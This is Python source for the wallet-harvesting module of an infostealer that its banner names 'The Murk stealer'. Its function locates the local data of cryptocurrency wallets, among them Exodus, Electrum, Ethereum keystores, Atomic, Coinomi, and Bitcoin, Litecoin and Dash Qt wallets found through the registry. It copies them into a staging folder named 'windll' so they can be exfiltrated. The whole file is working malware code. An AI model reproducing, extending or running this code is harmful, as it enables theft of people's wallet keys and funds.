#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

import os
import winreg
from manager.logger import Log
import shutil


def Wallets():
    msgInfo = ""
    Log("===========Wallets===========")
    msgInfo+="\n\n\n**💰Wallets💰**"
    roaming = os.getenv('APPDATA')
    pathToLogs = f"{os.getenv('LOCALAPPDATA')}\\windll\\Wallets"

    directory = {
        'Exodus': roaming + '\\Exodus\\exodus.wallet\\',
        'Electrum': roaming + '\\Electrum\\wallets\\',
        'Etherium': roaming + '\\Ethereum\\keystore\\',
        'Armory': roaming + '\\Armory\\',
        'Bytecoin': roaming + '\\bytecoin\\',
        'Feather Wallet': roaming + '\\FeatherWallet\\',
        'Guarda': roaming + '\\Guarda\\Local Storage\\leveldb',
        'Atomic': roaming + '\\atomic\\Local Storage\\leveldb',
        'Coinimi': roaming + '\\Coinomi\\Coinomi\\wallets\\'
    }

    registry_directory = {
        "Litecoin",
        "Dash",
        "Bitcoin"
    }
    
    wallets = []

    for key, value in directory.items():
        if os.path.exists(value):
            wallets.append(value)
            msgInfo+=f"\n∟💸{key}"

    for wallet in registry_directory:
        try:
            registryKey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\" + wallet + "\\" + wallet + "-Qt")

            cdir = winreg.QueryValue(registryKey, "strDataDir") + "\\wallets"
            if os.path.exists(cdir):
                wallets.append(cdir)
        except Exception as e:
            Log(f"Wallets {wallet} ---> {e}")
    
    if wallets:
        os.mkdir(pathToLogs)
        for wallet in wallets:
            shutil.copytree(wallet, pathToLogs+"\\"+wallet.split("\\")[-2], False, None, dirs_exist_ok=True)

    return msgInfo

